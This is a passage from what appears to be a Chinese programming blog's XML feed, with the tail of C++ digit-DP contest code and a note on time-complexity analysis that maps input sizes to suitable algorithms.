class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> s0 = <span class="number">0</span>, s1 = <span class="number">0</span>, s2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="number">7</span>; x++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">0</span>; y &lt; <span class="number">7</span>; y++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x != a &amp;&amp; y != b) &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = f[i][j][x][y];</span><br><span class="line">        s0 = (s0 + v.s0) % N;</span><br><span class="line">        s1 = (s1 + v.s1) % N;</span><br><span class="line">        s2 = (s2 + v.s2) % N;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;s0, s1, s2&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(LL n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  LL bak_n = n % N;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  LL last_a = <span class="number">0</span>, last_b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; x; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">7</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="type">int</span> a = <span class="built_in">mod</span>(-last_a * power7[i + <span class="number">1</span>], <span class="number">7</span>);</span><br><span class="line">      <span class="type">int</span> b = <span class="built_in">mod</span>(-last_b, <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">auto</span> v = <span class="built_in">get</span>(i + <span class="number">1</span>, j, a, b);</span><br><span class="line">      res = <span class="built_in">mod</span>(res + </span><br><span class="line">                (last_a % N) * (last_a % N) % N * power9[i + <span class="number">1</span>] % N * power9[i + <span class="number">1</span>] % N * v.s0 % N + </span><br><span class="line">                <span class="number">2</span> * last_a % N *power9[i + <span class="number">1</span>] % N * v.s1 + </span><br><span class="line">                v.s2,</span><br><span class="line">                N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">7</span>) <span class="keyword">break</span>;</span><br><span class="line">    last_a = last_a * <span class="number">10</span> + x;</span><br><span class="line">    last_b += x;</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; last_a % <span class="number">7</span> &amp;&amp; last_b % <span class="number">7</span>)</span><br><span class="line">      res = (res + bak_n * bak_n) % N;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> T;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">  <span class="keyword">while</span> (T--) &#123;</span><br><span class="line">    LL l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">mod</span>(<span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>), N));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法提高课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数位DP </tag>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第7讲 时空复杂度分析</title>
      <link href="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-7-%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-7-%E6%97%B6%E7%A9%BA%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>一般ACM或者笔试题的时间限制是1秒或2秒。<br>在这种情况下，C++代码中的操作次数控制在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo>∼</mo><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^7\sim 10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span> 为最佳。</p><span id="more"></span><h1 id="由数据范围反推算法复杂度以及算法内容">由数据范围反推算法复杂度以及算法内容</h1><p>下面给出在不同数据范围下，代码的时间复杂度和算法该如何选择：</p><table><thead><tr><th>数据范围</th><th>时间复杂度</th><th>算法</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>30</mn></mrow><annotation encoding="application/x-tex">n\le 30</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">30</span></span></span></span></td><td>指数级别</td><td>dfs+剪枝、状态压缩dp</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">n\le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>floyd、dp、高斯消元</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">n\le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>dp、二分、朴素版dijkstra、朴素版Prim、Bellman-Ford</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 10,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot \sqrt n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0503em;vertical-align:-0.25em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="padding-left:0.833em;">n</span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>块状链表、分块、莫队</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>100</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 100,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">100</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>各种sort、线段树、树状数组、set/map、heap、、拓扑排序、dijkstra+heap、prim+heap、Kruskal、spfa、求凸包、求半平面交、二分、CDQ分治、整体二分、后缀数组、树链剖分、动态树</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 1,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br>常数较小的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>单调队列、 hash、双指针扫描、并查集，kmp、AC自动机<br>sort、树状数组、heap、dijkstra、spfa</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>10</mn><mo separator="true">,</mo><mn>000</mn><mo separator="true">,</mo><mn>000</mn></mrow><annotation encoding="application/x-tex">n\le 10,000,000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>双指针扫描、kmp、AC自动机、线性筛素数</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msqrt><mi>n</mi></msqrt><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\sqrt n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0503em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8003em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="padding-left:0.833em;">n</span></span><span style="top:-2.7603em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2397em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>判断质数</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td>判断质数最大公约数，快速幂，数位DP</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>1000</mn></msup></mrow><annotation encoding="application/x-tex">n\le 10^{1000}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1000</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O((logn)^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">((</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td>高精度加减乘除</td></tr><tr><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mrow><mn>1000</mn><mo separator="true">,</mo><mn>000</mn></mrow></msup></mrow><annotation encoding="application/x-tex">n\le 10^{1000,000}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1000</span><span class="mpunct mtight">,</span><span class="mord mtight">000</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo>×</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logk\times loglogk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></td><td>k表示位数 ，高精度加减、FFT/NTT</td></tr></tbody></table><p>参考：</p><ol><li><p><a href="https://www.acwing.com/blog/content/32/">yxc.由数据范围反推算法复杂度以及算法内容</a></p></li><li><p><a href="https://www.acwing.com/blog/content/3398/">松鼠爱葡萄.第七章 时空复杂度分析 笔记</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法基础课 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第6讲 贪心</title>
      <link href="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/"/>
      <url>/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/</url>
      
